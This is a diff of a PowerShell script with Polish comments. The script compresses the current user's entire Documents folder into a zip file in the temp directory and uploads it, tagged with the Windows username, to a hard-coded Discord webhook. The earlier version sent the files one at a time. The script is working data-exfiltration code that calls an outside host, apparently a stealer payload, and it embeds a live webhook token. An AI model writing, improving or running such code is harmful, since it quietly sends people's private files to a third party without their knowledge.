@@ -1,4 +1,4 @@
-function Upload-FilesToDiscord {
+function Upload-ZippedFilesToDiscord {
     [CmdletBinding()]
     param (
         [parameter(Position=0, Mandatory=$False)]
@@ -18,28 +18,27 @@ function Upload-FilesToDiscord {
         return
     }
 
-    # Pobranie plików z folderu
-    $files = Get-ChildItem -Path $folderPath
+    # Tworzenie nazwy pliku .zip
+    $zipPath = "$env:TEMP\Documents.zip"
 
-    foreach ($file in $files) {
-        $filePath = $file.FullName
-        $fileName = $file.Name
+    # Kompresowanie plików i folderów do pliku .zip
+    Compress-Archive -Path "$folderPath\*" -DestinationPath $zipPath
 
-        $Body = @{
-            'username' = $env:USERNAME
-            'content'  = "Uploading file: $fileName"
-        }
-
-        # Wysyłanie wiadomości tekstowej na Discord
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json)
-
-        # Wysyłanie pliku na Discord
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -InFile $filePath -Headers @{ 'Content-Type' = 'multipart/form-data' }
+    $Body = @{
+        'username' = $env:USERNAME
+        'content'  = "Uploading zipped files: Documents.zip"
     }
+
+    # Wysyłanie wiadomości tekstowej na Discord
+    Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json)
+
+    # Wysyłanie pliku .zip na Discord
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -InFile $zipPath -Headers @{ 'Content-Type' = 'multipart/form-data' }
 }
 
 # Przykład użycia
 $webhookUrl = "https://discord.com/api/webhooks/1169613960429965382/uSQurwvfaGLDPwSZosk8AdXV3Yfk0kkupkFZPUJvhjf7lS5aww0M6GWxViPns5CFUZON"
 $folderPath = "$env:USERPROFILE\Documents"
 
-Upload-FilesToDiscord -folderPath $folderPath -webhookUrl $webhookUrl
+
+Upload-ZippedFilesToDiscord -folderPath $folderPath -webhookUrl $webhookUrl
